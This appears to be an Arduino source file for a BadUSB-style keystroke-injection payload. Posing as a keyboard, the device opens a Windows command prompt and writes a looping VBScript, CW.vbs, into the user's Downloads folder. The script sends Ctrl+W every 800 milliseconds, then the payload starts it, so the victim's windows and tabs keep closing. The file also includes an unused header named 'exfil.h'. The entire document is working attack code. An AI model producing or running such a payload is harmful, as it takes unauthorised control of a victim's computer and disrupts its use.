#include "exfil.h"
#include "phukd.h"

void payload() {
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.println("cmd");
  delay(3000);
  Keyboard.println("cd %userprofile%/Downloads");
  delay(2000);
  Keyboard.println("copy con CW.vbs");
  delay(2000);
  Keyboard.println("do");
  delay(2000);
  Keyboard.println("Set objShell = CreateObject(\"WScript.Shell\")");
  delay(2000);
  Keyboard.println("WScript.Sleep 800");
  delay(2000);
  Keyboard.println("objShell.SendKeys \"^{W}\"");
  delay(2000);
  Keyboard.println("loop");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("start CW.vbs && exit");
}
